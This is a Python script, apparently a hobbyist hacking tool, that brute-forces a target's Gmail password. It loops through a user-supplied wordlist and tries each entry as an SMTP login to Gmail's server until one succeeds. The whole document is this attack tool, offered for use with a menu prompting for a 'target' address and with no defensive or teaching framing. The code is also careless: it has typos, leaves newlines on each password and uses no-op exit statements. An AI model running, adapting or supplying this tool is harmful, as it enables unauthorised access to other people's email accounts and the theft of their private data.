import smtplib
smtpserver = smtplib.SMTP("smtp.gmail.com:587")
smtpserver.ehlo()
smtpserver.starttls()
print("\t coded by Mohammad Sultani")
print("\n\n\n")
print(">>>> ID[1]  Enter Your Gmail Traget   ")
print(">>>> ID[2]  help ")
print(">>>> ID[3]  Exit ")
print("\n")
UID = input("Enter  Your  ID  :  ")
UID = int(UID)
def ano ():
    email = input(">>=  Enter Your Gmail  :  ")
    if('@gmail.com' in email):
        email = email
        password_file = input(">>=  Enter Your Password Files  :   ")
        password_file = open(password_file)
        for password in password_file:
           try:
               smtpserver.login(email,password)
               print("Password Found  :  ",password)
               break
           except smtplib.SMTPAuthenticationError :
                print("Passwor injections  :  ",password)
        input("Enter Your Continue  :  ")
    else:
        print(">>>not gmail")
        y = input(">>>rty agin (y,n)")
        if(y == "y"):
            ano()
        if(y == "n"):
            exit
        if(y == "yes"):
            ano()
        if(y == "no"):
            exit
        if(y == "Y"):
            ano()
        if(y == "N"):
            exit
        if(y == "YES"):
            ano()
        if(y == "NO"):
            exit
        
def help():
    print("\t \tCodyd By Mohammad Sultani")
    print("\t \t     version  1.0")
    print("\t \t programing  :  python")
    print("\n\n\n\n\n\n")
    print("\n\n\n")
    print(">>>> ID[1]  Enter Your Gmail Traget   ")
    print(">>>> ID[2]  help ")
    print(">>>> ID[3]  Exit ")
    print("\n")
    UID = input("Enter  Your  ID  :  ")
    UID = int(UID)
    if(UID == 1):
        ano()
    if(UID == 2):
        help()
    if(UID == 3):
        exit
if(UID == 1):
    ano()
if(UID == 2):
    help()
if(UID == 3):
    exit
